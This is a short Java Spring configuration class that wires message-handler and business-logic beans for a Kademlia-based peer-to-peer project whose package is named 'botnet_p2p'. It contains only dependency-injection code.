package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;


@Configuration
@Import(botnet_p2p.p2p_layer.Config.class)
public class Config {
    private P2pLayer p2pLayer;
    private KademliaPeer me;

    public Config(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    @Bean
    public KadMessageHandler kadMessageHandler() {
        return new KadMessageHandler(p2pLayer, me);
    }

    @Bean
    public BotMessageHandler botMessageHandler() {
        return new BotMessageHandler(p2pLayer, me);
    }

    @Bean
    public BusinessLogicLayer businessLogicLayer() {
        return new BusinessLogicLayer(p2pLayer, me, kadMessageHandler(), botMessageHandler());
    }
}
